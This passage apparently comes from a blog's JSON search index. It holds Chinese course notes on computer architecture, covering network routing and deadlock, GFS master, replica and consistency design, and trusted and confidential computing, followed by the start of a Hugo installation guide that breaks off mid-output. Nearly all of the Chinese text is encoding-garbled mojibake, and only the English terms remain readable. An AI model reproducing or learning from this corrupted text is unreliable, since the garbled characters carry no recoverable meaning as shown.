Deterministicï¼šæ‰€æœ‰ç›¸åŒçš„æº-ç›®æ ‡å¯¹é€‰æ‹©ç›¸åŒè·¯å¾„\nç®€å• æ— æ­»é” å¯èƒ½ä¼šæœ‰é«˜ç«äº‰ ä¸èƒ½åˆ©ç”¨è·¯å¾„å¤šæ ·æ€§ æµé‡æ— å…³è·¯ç”± Obliviousï¼šé€‰æ‹©ä¸åŒçš„è·¯å¾„ï¼Œæ— éœ€è€ƒè™‘ç½‘ç»œçŠ¶æ€\nValiant ç®—æ³•ï¼š An example of oblivious algorithm ç›®æ ‡: Balance network load åŸºç¡€æ€è·¯: Randomly choose an intermediate destination,route to it first, then route from there to destination Randomizes/balances network load Non minimal (packet latency can increase) Optimizations: Do this on high load Restrict the intermediate node to be close (in the same quadrant) æ— ç¼“å†²åè½¬è·¯ç”± Bufferless Deflection Routing\nKey idea: Packets are never buffered in the network. When two packets contend for the same link, one is deflected Input buffers are eliminated: packets are buffered in pipeline latches and on network links è‡ªé€‚åº”è·¯ç”± Adaptiveï¼šèƒ½é€‰æ‹©ä¸åŒçš„è·¯å¾„ï¼Œé€‚åº”ç½‘ç»œçš„çŠ¶æ€\næœ€å°åŒ–è‡ªé€‚åº”è·¯ç”± Minimal adaptive Router uses network state (e.g., downstream buffer occupancy) to pick which â€œproductiveâ€ output port to send a packet to Productive output port: port that gets the packet closer to its destination Aware of local congestion Minimality restricts achievable link utilization (load balance) éæœ€å°åŒ–æ–¹æ¡ˆ Non-minimal (fully) adaptive â€œMisrouteâ€ packets to non-productive output ports based on network state Can achieve better network utilization and load balance Need to guarantee livelock freedom æ­»é”é—®é¢˜ Deadlock\næ²¡æœ‰è½¬å‘è¿›ç¨‹ No forward progress ç”±èµ„æºçš„å¾ªç¯ä¾èµ–æ‰€å¯¼è‡´ Caused by circular dependencies on resources æ¯ä¸ªåŒ…éƒ½ç­‰å¾…å¦ä¸€ä¸ªåŒ…é‡Šæ”¾æ‰€å æœ‰çš„ç¼“å†²åŒº Each packet waits for a buffer occupied by another packet downstream è§£å†³æ–¹æ¡ˆ\nåœ¨è·¯ç”±ä¸­é¿å…å¾ªç¯ Avoid cycles in routing\nç»´åº¦é¡ºåºè·¯ç”± Dimension order routing Cannot build a circular dependency è½¬å‘è®°å½•ä¸é™åˆ¶ Restrict the â€œturnsâ€ each packet can take åŠ ç¼“å†² Avoid deadlock by adding more buffering (escape paths)\nç›‘æµ‹å’Œæ‰“ç ´æ­»é” Detect and break deadlock\nå¯æŠ¢å ç¼“å†²åŒº Preemption of buffers è½¬å‘æ¨¡å‹ Turn Model to Avoid Deadlock\nIdea åˆ†ææ•°æ®åŒ…åœ¨ç½‘ç»œä¸­å¯ä»¥è½¬å‘çš„æ–¹å‘ Analyze directions in which packets can turn in the network ç¡®å®šè¿™äº›è½¬å‘å¯ä»¥å½¢æˆçš„å¾ªç¯ Determine the cycles that such turns can form ç¦æ­¢è¶³å¤Ÿæ•°é‡çš„è½¬å‘ä»¥é˜»æ­¢å¯èƒ½çš„å¾ªç¯ Prohibit just enough turns to break possible cycles æµé‡æ§åˆ¶ Buffering and Flow Control æµé‡æ§åˆ¶çš„åŸºç¡€æ€è·¯\nCircuit switching Bufferless (Packet/flit based) Store and forward (Packet based) Virtual cut through (Packet based) Wormhole (Flit based) åä¸€ã€ä»“åº“çº§è®¡ç®—æœºå’Œåˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿ Warehouse-scale computer (WSC) Provides Internet services Search, social networking, online maps, video sharing, online hopping, email, cloud computing, etc. Differences with HPC â€œclustersâ€:\nClusters have higher performance processors and network Clusters emphasize thread-level parallelism, WSCs emphasize request-level parallelism Differences with datacenters:\nDatacenters consolidate different machines and software intoone location\nDatacenters emphasize virtual machines and hardware heterogeneity in order to serve varied customers\nWSCçš„åˆ†å¸ƒå¼ç³»ç»Ÿå’Œè½¯ä»¶\nç¼–ç¨‹æ¡†æ¶Program Frameworkï¼šMapReduceï¼ˆGoogleï¼‰\næ–‡ä»¶ç³»ç»ŸFile systems: GFSï¼ˆGoogleï¼‰\næ•°æ®åº“Database: Dynamoï¼ˆAmazonï¼‰ ã€BigTableï¼ˆGoogleï¼‰ã€Haystackï¼ˆFacebookï¼‰\nç¼“å­˜ç³»ç»ŸCacheï¼šMemcacheï¼ˆ@Facebookï¼‰\nGoogle WSC â€œä¸‰é©¾é©¬è½¦â€ï¼šMapReduceã€bigTableã€GFSï¼Œå…¶å¼€æºç‰ˆæœ¬ï¼šHadoopã€Hbaseï¼ˆJavaï¼‰ã€HDFS\nåˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿ GFSç³»ç»Ÿæ¶æ„\nGFSä¸­æœ‰ä¸‰ç§èŠ‚ç‚¹ï¼šGFS clientï¼ŒGFS masterï¼ŒGFS chunkserver GFS clientï¼šç»´æŒä¸“ç”¨æ¥å£ï¼Œä¸åº”ç”¨äº¤äº’ GFS masterï¼šç»´æŒå…ƒæ•°æ®ï¼Œç»Ÿä¸€ç®¡ç†chunkä½ç½®ä¸ç§Ÿçº¦ GFS chunkserverï¼šå­˜å‚¨æ•°æ® GFSå­˜å‚¨è®¾è®¡\nè€ƒè™‘åˆ°Googleä¸šåŠ¡éœ€è¦å­˜å‚¨çš„æ–‡ä»¶(å‡ ä¸ªGB)å¯èƒ½éå¸¸å¤§ï¼Œå¹¶ä¸”å¤§å°ä¸å‡ï¼ŒGFSæ²¡æœ‰é€‰æ‹©ç›´æ¥ä»¥æ–‡ä»¶ä¸ºå•ä½è¿›è¡Œå­˜å‚¨ï¼Œè€Œæ˜¯æŠŠæ–‡ä»¶åˆ†ä¸ºä¸€ä¸ªä¸ªçš„chunkæ¥å­˜å‚¨ï¼Œæ¯ä¸ªchunkä¸º64MB è¾ƒå¤§çš„chunkå¯ä»¥æœ‰æ•ˆå‡å°‘ç³»ç»Ÿå†…éƒ¨çš„å¯»å€å’Œäº¤äº’æ¬¡æ•° è¾ƒå¤§çš„chunkä¹Ÿæ„å‘³ç€clientå¯èƒ½åœ¨ä¸€ä¸ªchunkä¸Šæ‰§è¡Œå¤šæ¬¡æ“ä½œï¼Œè¿™æ ·å¯ä»¥æœç”¨TCPè¿æ¥ï¼ŒèŠ‚çœç½‘ç»œå¼€é”€ æ›´å¤§çš„chunkä¹Ÿå¯ä»¥å‡å°‘chunkçš„æ•°é‡ï¼Œä»è€ŒèŠ‚çœå…ƒæ•°æ®å­˜å‚¨å¼€é”€ï¼Œç›¸å½“äºèŠ‚çœäº†ç³»ç»Ÿå†…æœ€çè´µçš„å†…å­˜èµ„æº ç³»ç»Ÿé€šè¿‡åˆ†å‰²å­˜å‚¨æ¥å°†æ–‡ä»¶åˆ†æ•£å­˜å‚¨åœ¨å¤šå°æœåŠ¡å™¨ä¸Š é‡‡ç”¨æ›´å¤§çš„chunkä»¥åŠé…å¥—çš„ä¸€è‡´æ€§ç­–ç•¥æ¥æ”¯æŒå¤§æ–‡ä»¶å­˜å‚¨ GFSçš„Masterè®¾è®¡\nGFSé‡‡ç”¨å•MasterèŠ‚ç‚¹ï¼Œç”¨æ¥å­˜å‚¨æ•´ä¸ªæ–‡ä»¶ç³»ç»Ÿçš„ä¸‰ç±»å…ƒæ•°æ®\næ‰€æœ‰æ–‡ä»¶å’Œchunkçš„namespaceã€æŒä¹…åŒ–ã€‘ æ–‡ä»¶åˆ°chunkçš„æ˜ å°„ã€æŒä¹…åŒ–ã€‘ æ¯ä¸ªchunkçš„ä½ç½®ã€ä¸æŒä¹…åŒ–ã€‘ ä¸ºä»€ä¹ˆä½ç½®ä¸éœ€è¦æŒä¹…åŒ–ï¼Œå› ä¸ºmasteråœ¨é‡å¯çš„æ—¶å€™å¯ä»¥ä»å„ä¸ªchunkserverå¤„æ”¶é›†chunkçš„ä½ç½®ä¿¡æ¯ GFSé‡‡å–çš„ä¸€ç³»åˆ—æªæ–½æ¥ç¡®ä¿masterä¸ä¼šæˆä¸ºæ•´ä¸ªç³»ç»Ÿçš„ç“¶é¢ˆ\nGFSæ‰€æœ‰çš„æ•°æ®æµä¸ç»è¿‡Masterï¼Œè€Œæ˜¯ç›´æ¥ç”±clientå’Œchunkserverç›´æ¥äº¤äº’ï¼ˆæ•°æ®æµå’Œæ§åˆ¶æµåˆ†ç¦»ï¼‰ GFSçš„clientä¼šç¼“å­˜masterçš„å…ƒæ•°æ®ï¼Œåœ¨å¤§éƒ¨åˆ†æƒ…å†µä¸‹ï¼Œéƒ½æ— éœ€è®¿é—®master é‡‡å–ä¸€ç³»åˆ—æ‰‹æ®µæ¥èŠ‚çœmasterçš„å†…å­˜ï¼ŒåŒ…æ‹¬å¢å¤§chunkçš„å¤§å°ä»¥èŠ‚çœchunkçš„æ•°é‡ã€å¯¹å…ƒæ•°æ®è¿›è¡Œå®šåˆ¶åŒ–çš„å‹ç¼©ç­‰ å¦‚ä½•å®ç°è‡ªåŠ¨æ‰©ç¼©å®¹ï¼Ÿ\u0026ndash;\u0026gt;åœ¨masterèŠ‚ç‚¹ä¸Šå¢å‡ã€è°ƒæ•´chunkçš„å…ƒæ•°æ®å³å¯\næ€æ ·çŸ¥é“ä¸€ä¸ªæ–‡ä»¶å­˜å‚¨åœ¨å“ªå°æœºå™¨ä¸Šï¼Ÿ\u0026ndash;\u0026gt;æ ¹æ®masterä¸­æ–‡ä»¶åˆ°chunkå†åˆ°chunkä½ç½®çš„æ˜ å°„æ¥å®šä½å…·ä½“çš„chunkserver\nè€ƒè¯•é‡ç‚¹ï¼Œé¢˜ç›®åº”è¯¥æ˜¯64Bï¼Œæ‰“é”™äº†\nGFSçš„é«˜å¯ç”¨è®¾è®¡\nmasterçš„é«˜å¯ç”¨è®¾è®¡\né™¤äº†primary masterä»¥å¤–ï¼Œè¿˜ç»´æŒä¸€ä¸ªshadow masterä½œä¸ºå¤‡ä»½master masteråœ¨æ­£å¸¸è¿è¡Œæ—¶ï¼Œå¯¹å…ƒæ•°æ®æ‰€åšçš„æ‰€æœ‰ä¿®æ”¹æ“ä½œï¼Œéƒ½è¦å…ˆè®°å½•æ—¥å¿—(WAL)ï¼Œå†çœŸæ­£å»ä¿®æ”¹å†…å­˜ä¸­çš„å…ƒæ•°æ® åŒæ—¶primary masterä¼šå®æ—¶å‘shadow masteråŒæ­¥WALï¼Œåªæœ‰shadow masteråŒæ­¥æ—¥å¿—å®Œæˆï¼Œå…ƒæ•°æ®ä¿®æ”¹æ“ä½œæ‰ç®—æˆåŠŸ å¦‚ä½•å®ç°è‡ªåŠ¨åˆ‡æ¢\nå¦‚æœmasterå®•æœºï¼Œä¼šé€šè¿‡Googleçš„Chubby(æœ¬è´¨æ—¶å…±è¯†ç®—æ³•)æ¥è¯†åˆ«å¹¶åˆ‡æ¢åˆ°shadow masterï¼Œè¿™ä¸ªåˆ‡æ¢æ—¶ç§’çº§çš„ chunkçš„é«˜å¯ç”¨è®¾è®¡\næ–‡ä»¶è¢«æ‹†ä¸ºä¸€ä¸ªä¸ªçš„chunkæ¥è¿›è¡Œå­˜å‚¨çš„ï¼Œæ¯ä¸ªchunkéƒ½æœ‰ä¸‰ä¸ªå‰¯æœ¬ï¼Œç”±masterç»´æŒå‰¯æœ¬ä¿¡æ¯ å¯¹ä¸€ä¸ªchunkçš„æ¯æ¬¡å†™å…¥éƒ½å¿…é¡»ä¿è¯åœ¨ä¸‰ä¸ªå‰¯æœ¬ä¸­çš„å†™å…¥éƒ½å®Œæˆï¼Œæ‰ç®—å†™å…¥å®Œæˆ å¦‚æœä¸€ä¸ªchunkserverå®•æœºï¼Œè¿˜æœ‰ä¸¤ä¸ªå‰¯æœ¬ä¿å­˜è¿™ä¸ªchunkçš„ä¿¡æ¯ å¦‚æœå®•æœºçš„å‰¯æœ¬åœ¨ä¸€æ®µæ—¶é—´åæ²¡æœ‰æ¢å¤ï¼Œé‚£ä¹ˆmasterä¼šåœ¨å¦ä¸€ä¸ªchunkseveré‡å»ºä¸€ä¸ªå‰¯æœ¬ï¼Œä»è€Œå°†chunkçš„å‰¯æœ¬æ•°ç›®ç»´æŒåœ¨3ä¸ª masterå¯¹å‰¯æœ¬ä½ç½®çš„é€‰æ‹©ç­–ç•¥è¦éµå¾ªä»¥ä¸‹ä¸‰ç‚¹ æ–°å‰¯æœ¬æ‰€åœ¨çš„chunkserverçš„èµ„æºåˆ©ç”¨ç‡è¦ä½ æ–°å‰¯æœ¬æ‰€åœ¨çš„chunkserveræœ€è¿‘åˆ›å»ºçš„chunkå‰¯æœ¬ä¸å¤šï¼Œé˜²æ­¢å…¶ç¬é—´æˆä¸ºçƒ­ç‚¹ ä¸èƒ½å’Œchunkå…¶å®ƒå‰¯æœ¬åœ¨åŒä¸€æœºæ¶ GFSçš„è¯»å†™æµç¨‹\nGFSçš„å†™å…¥\né‡‡ç”¨æµæ°´çº¿æŠ€æœ¯ æ•°æ®æµä¸æ§åˆ¶æµåˆ†ç¦»çš„æŠ€æœ¯ GFSçš„å†™å…¥æµç¨‹\n1,2.Clientå‘Masterè¯¢é—®è¦å†™å…¥chunkçš„ç§Ÿçº¦åœ¨å“ªä¸ªchunkserveä¸Š(Primary Replica)ï¼Œä»¥åŠå…¶ä»–å‰¯æœ¬(Secondary Replicas)çš„ä½ç½®(é€šå¸¸Clientä¸­ç›´æ¥å°±æœ‰ç¼“å­˜) 3.Clientå°†æ•°æ®æ¨é€åˆ°æ‰€æœ‰çš„å‰¯æœ¬ä¸Šï¼Œè¿™ä¸€æ­¥å°±ä¼šç”¨åˆ°æµæ°´çº¿æŠ€æœ¯ï¼Œä¹Ÿæ˜¯å†™å…¥è¿‡ç¨‹ä¸­å”¯ä¸€çš„æ•°æ®æµæ“ä½œã€‚ 4.ç¡®è®¤æ‰€æœ‰å‰¯æœ¬éƒ½æ”¶åˆ°äº†æ•°æ®ä¹‹åï¼Œclientå‘é€æ­£å¼å†™å…¥çš„è¯·æ±‚åˆ°Primary Replicaã€‚Primary Replicaæ¥æ”¶åˆ°è¿™ä¸ªè¯·æ±‚åï¼Œä¼šå¯¹è¿™ä¸ªChunkä¸Šæ‰€æœ‰çš„æ“ä½œæ’åºï¼Œç„¶åæŒ‰ç…§é¡ºåºæ‰§è¡Œå†™å…¥ã€‚ è¿™é‡Œå¾ˆå…³é”®ï¼ŒPrimary Replicaå”¯ä¸€ç¡®å®šå†™å…¥é¡ºåºï¼Œä¿è¯å‰¯æœ¬ä¸€è‡´æ€§ã€‚\n5.Primary ReplicaæŠŠChunkå†™å…¥çš„é¡ºåºåŒæ­¥ç»™SecondaryReplicaã€‚ æ³¨æ„ï¼Œå¦‚æœæ‰§è¡Œåˆ°è¿™ä¸€æ­¥ï¼ŒPrimary Replicaä¸Šå†™å…¥å·²ç»æˆåŠŸäº†.\n6.æ‰€æœ‰çš„Secondary Replicaè¿”å›Primary Replicaå†™å…¥å®ŒæˆÂ·7.Primary Replicaè¿”å›å†™å…¥ç»“æœç»™Clientã€‚ æ‰€æœ‰å‰¯æœ¬éƒ½å†™å…¥æˆåŠŸ: Clientç¡®è®¤å†™å…¥å®Œæˆ\nä¸€éƒ¨åˆ†Secondary Replicaå†™å…¥å¤±è´¥ (æ²¡æœ‰å“åº”) :Clientè®¤ä¸ºå†™å…¥å¤±è´¥ï¼Œå¹¶ä»ç¬¬3æ­¥å¼€å§‹é‡æ–°æ‰§è¡Œã€‚\nå¦‚æœä¸€ä¸ªå†™å…¥æ“ä½œæ¶‰åŠåˆ°å¤šä¸ªchunkï¼Œclientä¼šæŠŠå®ƒä»¬åˆ†ä¸ºå¤šä¸ªå†™å…¥æ¥æ‰§è¡Œã€‚\næ”¹å†™çš„é—®é¢˜åœ¨äºä¸€ä¸ªæ”¹å†™æ“ä½œå¯èƒ½æ¶‰åŠåˆ°å¤šä¸ªchunkè€Œå¦‚æœéƒ¨åˆ†chunkæˆåŠŸï¼Œéƒ¨åˆ†chunkå¤±è´¥ï¼Œæˆ‘ä»¬è¯»åˆ°çš„æ–‡ä»¶å°±æ˜¯ä¸æ­£ç¡®çš„ã€‚\næ”¹å†™å¤§æ¦‚ç‡æ˜¯ä¸€ä¸ªåˆ†å¸ƒå¼æ“ä½œï¼Œå¦‚æœè¦ä¿è¯æ”¹å†™çš„å¼ºè‡´æ€§ï¼Œä»£ä»·å°±è¦å¤§å¾ˆå¤šäº†ã€‚è®ºæ–‡ä¸­ä¸€å†å¼ºè°ƒï¼ŒGFSæ¨èä½¿ç”¨è¿½åŠ çš„æ–¹å¼å†™å…¥æ–‡ä»¶å¹¶ä¸”Googleå†…éƒ¨ä½¿ç”¨GFSçš„åº”ç”¨ï¼Œå®ƒä»¬çš„ç»å¤§å¤šæ•°å†™å…¥ä¹Ÿéƒ½æ˜¯è¿½åŠ ã€‚\nGFSçš„è¯»å–æµç¨‹\nclientæ”¶åˆ°è¯»å–ä¸€ä¸ªæ–‡ä»¶çš„è¯·æ±‚åï¼Œé¦–å…ˆä¼šæŸ¥çœ‹è‡ªèº«çš„ç¼“å­˜ä¸­æœ‰æ²¡æœ‰æ­¤æ–‡ä»¶çš„å…ƒæ•°æ®ä¿¡æ¯ã€‚å¦‚æœæ²¡æœ‰ï¼Œåˆ™è¯·æ±‚master(æˆ–shadow master)è·å–å…ƒæ•°æ®ä¿¡æ¯å¹¶ç¼“å­˜ã€‚ clientè®¡ç®—æ–‡ä»¶åç§»é‡å¯¹åº”çš„chunkã€‚ ç„¶åclientå‘ç¦»è‡ªèº«æœ€è¿‘çš„chunkserverå‘é€è¯»è¯·æ±‚ã€‚å¦‚æœåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œå‘ç°è¿™ä¸ªchunkserveræ²¡æœ‰è‡ªå·±æ‰€éœ€çš„chunkï¼Œè¯´æ˜ç¼“å­˜å¤±æ•ˆï¼Œå°±å†è¯·æ±‚masterè·å–æœ€æ–°çš„å…ƒæ•°æ® è¯»å–æ—¶ä¼šè¿›è¡Œchunkæ ¡éªŒå’Œçš„ç¡®è®¤å¦‚æœæ ¡éªŒå’ŒéªŒè¯ä¸é€šè¿‡ï¼Œé€‰æ‹©å…¶ä»–å‰¯æœ¬è¿›è¡Œè¯»å– Clientè¿”å›åº”ç”¨è¯»å–ç»“æœ æ€»ä½“ä¸ŠGFSæ˜¯ä¸‰å†™ä¸€è¯»çš„æ¨¡å¼ã€‚å†™å…¥é‡‡ç”¨äº†æµæ°´çº¿æŠ€æœ¯å’Œæ•°æ®æµä¸æ§åˆ¶æµåˆ†ç¦»æŠ€æœ¯ä¿è¯æ€§èƒ½;è¿½åŠ å¯¹ä¸€è‡´æ€§çš„ä¿è¯æ›´ç®€å•ï¼Œä¹Ÿæ›´åŠ é«˜æ•ˆï¼Œæ‰€ä»¥å†™å…¥å¤šé‡‡ç”¨è¿½åŠ çš„å½¢å¼ã€‚è¯»å–åˆ™æ‰€æœ‰å‰¯æœ¬éƒ½å¯è¯»åœ¨å°±è¿‘è¯»å–çš„æƒ…å†µä¸‹æ€§èƒ½éå¸¸é«˜\nGFSçš„ä¸€è‡´æ€§æ¨¡å‹\nGFSæŠŠæ–‡ä»¶æ•°æ®çš„ä¸€è‡´æ€§å¤§ä½“ä¸Šåˆ†ä¸ºä¸‰ä¸ªå±‚æ¬¡ï¼šinconsistentï¼Œconsistentï¼Œdefined\nconsistentï¼šä¸€è‡´çš„ï¼Œè¡¨ç¤ºæ–‡ä»¶æ— è®ºä»å“ªä¸ªå‰¯æœ¬è¯»å–ï¼Œç»“æœéƒ½æ˜¯ä¸€æ ·çš„ definedï¼šå·²å®šä¹‰çš„ï¼Œæ–‡ä»¶å‘ç”Ÿä¿®æ”¹æ“ä½œåï¼Œè¯»å–æ—¶ä¸€è‡´çš„ï¼Œä¸”clientå¯ä»¥çœ‹åˆ°æœ€æ–°ä¿®æ”¹çš„å†…å®¹ ä¸²è¡Œæ”¹å†™æˆåŠŸ: definedã€‚å› ä¸ºæ‰€æœ‰å‰¯æœ¬éƒ½å®Œæˆæ”¹å†™åæ‰èƒ½è¿”å›æˆåŠŸï¼Œå¹¶ä¸”é‡å¤æ‰§è¡Œæ”¹å†™ä¹Ÿä¸ä¼šäº§ç”Ÿå‰¯æœ¬é—´ä¸ä¸€è‡´ï¼Œæ‰€ä»¥ä¸²è¡Œæ”¹å†™æˆåŠŸæ•°æ®æ˜¯definedã€‚\nå†™å…¥å¤±è´¥:inconsistentã€‚è¿™é€šå¸¸å‘ç”Ÿåœ¨é‡è¯•äº†ä¸€å®šæ¬¡æ•°ä»æ— æ³•åœ¨æ‰€æœ‰å‰¯æœ¬éƒ½å†™å…¥æˆåŠŸæ—¶æ„å‘³ç€å¤§æ¦‚ç‡æœ‰ä¸ªå‰¯æœ¬å®•æœºäº†ï¼Œè¿™ç§æƒ…å†µä¸‹ä¸€å®šæ˜¯ä¸ä¸€è‡´çš„ï¼ŒClientä¹Ÿä¸ä¼šè¿”å›æˆåŠŸã€‚\nå¹¶å‘æ”¹å†™æˆåŠŸ: consistent but undefinedã€‚å¯¹äºå•ä¸ªæ”¹å†™æ“ä½œè€Œè¨€ï¼ŒæˆåŠŸå°±æ„å‘³ç€å‰¯æœ¬é—´æ˜¯ä¸€è‡´çš„ã€‚ä½†å¹¶å‘æ”¹å†™æ“ä½œå¯èƒ½ä¼šæ¶‰åŠå¤šä¸ªchunkï¼Œä¸åŒchunkå¯¹æ”¹å†™çš„æ‰§è¡Œé¡ºåºä¸ä¸€å®šç›¸åŒï¼Œè€Œè¿™æœ‰å¯èƒ½é€ æˆåº”ç”¨è¯»å–ä¸åˆ°é¢„æœŸçš„ç»“æœã€‚\nè¿½åŠ å†™æˆåŠŸ: defined interspersed with inconsistent (å·²å®šä¹‰ä½†æœ‰å¯èƒ½å­˜åœ¨å‰¯æœ¬é—´ä¸ä¸€è‡´interspersed with inconsistentï¼Œè¿½åŠ çš„é‡å¤æ‰§è¡Œä¼šé€ æˆå‰¯æœ¬é—´çš„ä¸ä¸€è‡´ã€‚\nNoSQLæ•°æ®åº“ BigTable åˆ†å¸ƒå¼ç¼–ç¨‹æ¡†æ¶MapRedue**** æ•°æ®ä¸­å¿ƒç½‘ç»œData Center Networks äº‘è®¡ç®—å®‰å…¨ å®‰å…¨è®¡ç®—æ¨¡å¼ä¸€ï¼šå¯ä¿¡è®¡ç®—\nå¯ä¿¡è®¡ç®—çš„å«ä¹‰\nå¯ä¿¡è®¡ç®—ç»„ç»‡TCGï¼šå¦‚æœä¸€ä¸ªå®ä½“çš„è¡Œä¸ºæ˜¯ä»¥é¢„æœŸçš„æ–¹å¼ï¼Œç¬¦åˆé¢„æœŸçš„ç›®æ ‡ï¼Œåˆ™è¯¥å®ä½“æ˜¯å¯ä¿¡çš„ ISO/IEC 15408æ ‡å‡†ï¼šå‚ä¸è®¡ç®—çš„ç»„ä»¶ã€æ“ä½œæˆ–è¿‡ç¨‹åœ¨ä»»æ„çš„æ¡ä»¶ä¸‹æ˜¯å¯é¢„æµ‹çš„ï¼Œå¹¶èƒ½å¤ŸæŠµå¾¡ç—…æ¯’å’Œä¸€å®šç¨‹åº¦çš„ç‰©ç†å¹²æ‰° æ²ˆæ˜Œç¥¥é™¢å£«ï¼šå¯ä¿¡â‰ˆå®‰å…¨+å¯é ï¼Œå¯ä¿¡è®¡ç®—ç³»ç»Ÿæ˜¯èƒ½å¤Ÿæä¾›ç³»ç»Ÿçš„å¯é æ€§ã€å¯ç”¨æ€§ã€ä¿¡æ¯å’Œè¡Œä¸ºå®‰å…¨æ€§çš„è®¡ç®—æœºç³»ç»Ÿ å·¥ä½œåŸç†\nå»ºç«‹ä¿¡ä»»æ ¹ï¼šä¿¡ä»»æ ¹çš„å¯ä¿¡æ€§ç”±ç‰©ç†å®‰å…¨ã€æŠ€æœ¯å®‰å…¨ä¸ç®¡ç†å®‰å…¨å…±åŒç¡®ä¿ å»ºç«‹ä¿¡ä»»é“¾ï¼šä»ä¿¡ä»»æ ¹å¼€å§‹åˆ°ç¡¬ä»¶å¹³å°ï¼Œåˆ°æ“ä½œç³»ç»Ÿå†åˆ°åº”ç”¨ï¼Œä¸€çº§è®¤è¯ä¸€çº§ï¼Œä¸€çº§ä¿¡ä»»ä¸€çº§ å±€é™æ€§\nå¯ä¿¡è®¡ç®—å¯¹æ•°æ®çš„ä¿æŠ¤åå¼±ï¼Œä»…é™å¯†é’¥å’Œå…³é”®æ•°æ®\nå®‰å…¨è®¡ç®—æ¨¡å¼äºŒï¼šæœºå¯†è®¡ç®—\næœºå¯†è®¡ç®—çš„å®šä¹‰\nIBMï¼šæœºå¯†è®¡ç®—æ˜¯ä¸€ç§äº‘è®¡ç®—æŠ€æœ¯ï¼Œå®ƒåœ¨å¤„ç†è¿‡ç¨‹ä¸­å°†æ•æ„Ÿæ•°æ®éš”ç¦»åœ¨å—ä¿æŠ¤çš„CPU Enclaveä¸­ æœºå¯†è®¡ç®—è”ç›ŸCCCï¼šæœºå¯†è®¡ç®—æ˜¯é€šè¿‡åœ¨åŸºäºç¡¬ä»¶å¯ä¿¡æ‰§è¡Œç¯å¢ƒä¸­æ‰§è¡Œè®¡ç®—æ¥ä¿æŠ¤ä½¿ç”¨ä¸­çš„æ•°æ® å†¯ç™»å›½é™¢å£«ï¼šæœºå¯†è®¡ç®—æ˜¯ä¸€ç§ä¿æŠ¤ä½¿ç”¨ä¸­çš„æ•°æ®å®‰å…¨çš„è®¡ç®—èŒƒå¼ å·¥ä½œåŸç†\næœºå¯†è®¡ç®—åˆ©ç”¨åŸºäºç¡¬ä»¶çš„å¯ä¿¡æ‰§è¡Œç¯å¢ƒå°†æ•°æ®ã€ç‰¹å®šåŠŸèƒ½æˆ–æ•´ä¸ªåº”ç”¨ç¨‹åºä¸æ“ä½œç³»ç»Ÿã€è™šæ‹Ÿæœºç®¡ç†ç¨‹ åºã€è™šæ‹Ÿæœºç®¡ç†å™¨ä»¥åŠå…¶ä»–ç‰¹æƒè¿›ç¨‹éš”ç¦»å¼€æ¥ï¼Œä»è€Œä¿æŠ¤æ•æ„Ÿæ•°æ® å±€é™æ€§\næœºå¯†è®¡ç®—æ”¯æ’‘æŠ€æœ¯SGXç­‰å­˜åœ¨ä¾§ä¿¡é“æ”»å‡»ï¼Œä¾èµ–å¯¹ç¡¬ä»¶å‚å•†çš„ä¿¡ä»»ï¼Œä¸”æœºå¯†è®¡ç®—ç¼ºä¹ç»Ÿä¸€çš„æŠ€æœ¯æ ‡å‡† å¯ä¿¡æ‰§è¡Œç¯å¢ƒTEE\nTEE æ˜¯ä¸€ç§å…·æœ‰è¿ç®—å’Œå‚¨å­˜åŠŸèƒ½ï¼Œèƒ½æä¾›å®‰å…¨æ€§å’Œå®Œæ•´æ€§ä¿æŠ¤çš„ç‹¬ç«‹å¤„ç†ç¯å¢ƒ\nåœ¨ç¡¬ä»¶ä¸­ä¸ºæ•æ„Ÿæ•°æ®å•ç‹¬åˆ†é…ä¸€å—éš”ç¦»çš„å†…å­˜ï¼Œæ‰€æœ‰æ•æ„Ÿæ•°æ®çš„è®¡ç®—å‡åœ¨è¿™å—å†…å­˜ä¸­è¿›è¡Œ\nå®‰å…¨è®¡ç®—æ¨¡å¼ä¸‰ï¼šå¯†æ€è®¡ç®—\nä»¥å¯†æ–‡ä¸ºè®¡ç®—å¯¹è±¡ï¼Œå…¶å®‰å…¨æ€§ä¸ä¾èµ–äºéš”ç¦»å’Œè®¿é—®æ§åˆ¶ã€ä¸ä¾èµ–äºç¡¬ä»¶å’Œè½¯ä»¶å®‰å…¨æ€§\n","date":"2023-12-26T00:00:00Z","image":"https://chenyuan1125.github.io/p/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/1_hu6408142527681263189.jpg","permalink":"https://chenyuan1125.github.io/p/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/","title":"è®¡ç®—æœºä½“ç³»ç»“æ„è¯¾ç¨‹ç¬”è®°"},{"content":"Hugoä»‹ç» Hugoæ˜¯ç”±Goè¯­è¨€å®ç°çš„é™æ€ç½‘ç«™ç”Ÿæˆå™¨ã€‚ç®€å•ã€æ˜“ç”¨ã€é«˜æ•ˆã€æ˜“æ‰©å±•ã€å¿«é€Ÿéƒ¨ç½²ã€‚\nHugoä¸­æ–‡æ–‡æ¡£åœ°å€ï¼š https://www.gohugo.org\nHugoå®‰è£… ä¸‹è½½åœ°å€ï¼šhttps://github.com/gohugoio/hugo/releases\næ‰¾åˆ°å¯¹åº”ç³»ç»Ÿçš„ä¸‹è½½æ–‡ä»¶(win10ä¸ºä¾‹ï¼Œå»ºè®®é€‰æ‹©extendedç‰ˆæœ¬ï¼Œæœ‰äº›ä¸»é¢˜éœ€è¦extendedç‰ˆæœ¬æ‰èƒ½æ­£å¸¸ä½¿ç”¨)\nå»ºç«‹blogæ–‡ä»¶å¤¹ï¼Œå¹¶å°†ä¸‹è½½å¥½çš„zipæ–‡ä»¶è§£å‹åˆ°è¯¥æ–‡ä»¶å¤¹ä¸‹(å»ºè®®ä¸è¦æœ‰ä¸­æ–‡å’Œç©ºæ ¼)\nå†å°†hogu.exeçš„è·¯å¾„æ·»åŠ åˆ°ç¯å¢ƒå˜é‡ä¸­(ä¸ä¼šåˆ™è¯·STFW)\nåœ¨cmdä¸­æŸ¥çœ‹å‘½ä»¤æ˜¯å¦æˆåŠŸ\nè¾“å…¥ä¸‹é¢å‘½ä»¤æŸ¥çœ‹æ˜¯å¦æˆåŠŸ $ hugo version è¾“å‡ºç»“æœï¼š Hugo Static 